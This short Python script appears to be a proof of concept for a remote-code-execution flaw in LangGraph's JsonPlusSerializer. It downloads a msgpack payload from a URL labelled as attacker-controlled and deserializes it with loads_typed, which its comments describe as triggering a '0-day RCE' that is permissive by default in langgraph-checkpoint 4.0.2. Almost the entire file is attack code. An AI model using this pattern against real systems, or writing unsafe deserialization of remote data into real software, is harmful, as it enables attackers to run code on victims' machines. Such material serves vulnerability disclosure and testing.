import requests
import os
from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer

# URL controlled by the attacker
ATTACKER_URL = "http://192.168.1.90:8000/payload.msgpack"

def load_remote_state():
    print(f"[*] Fetching state from {ATTACKER_URL}...")
    response = requests.get(ATTACKER_URL)
    
    # Victim uses the default LangGraph serializer
    # Note: Even in langgraph-checkpoint 4.0.2, this is permissive by default
    serde = JsonPlusSerializer()
    
    print("[*] Deserializing remote state...")
    # This triggers the 0-day RCE
    state = serde.loads_typed(("msgpack", response.content))
    print("[+] State loaded successfully.")

if __name__ == "__main__":
    load_remote_state()